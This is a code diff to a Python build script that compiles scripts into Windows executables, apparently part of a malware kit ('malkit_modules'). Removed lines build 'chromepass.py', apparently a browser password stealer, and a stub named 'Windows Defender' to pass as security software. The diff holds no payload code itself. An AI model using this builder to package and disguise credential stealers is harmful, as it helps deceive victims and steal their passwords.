@@ -12,7 +12,7 @@ def exebuild(target, include, output, icon="icon.ico"):
     try:
         includes = []
         if len(include) > 0:
-            includes = [f'{include}']
+            includes.append(include)
         sys.argv.append("pexe37")
         setup(
             options={
@@ -35,13 +35,14 @@ def exebuild(target, include, output, icon="icon.ico"):
 
             },
             zipfile=None,
-            windows=[{
+            console=[{
                 "script": target,
                 "icon_resources": [(1, icon)]
             }]
 
         )
     except BaseException as e:
+        raise(e)
         print("[+] polymorphism")
     if os.path.exists(f"{output}.exe"):
         os.remove(f"{output}.exe")
@@ -111,7 +112,5 @@ def exe_bytes(filename: str):
 
 
 if __name__ == "__main__":
-    # exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
-    #          output='Windows Defender', icon="icons/icon2.ico")
-    exebuild(target="chromepass.py", include='',
-             output="chromepass", icon="icons/icon2.ico")
+    exebuild(target="helloworld.py", include='',
+             output="stub", icon="../icons/icon2.ico")
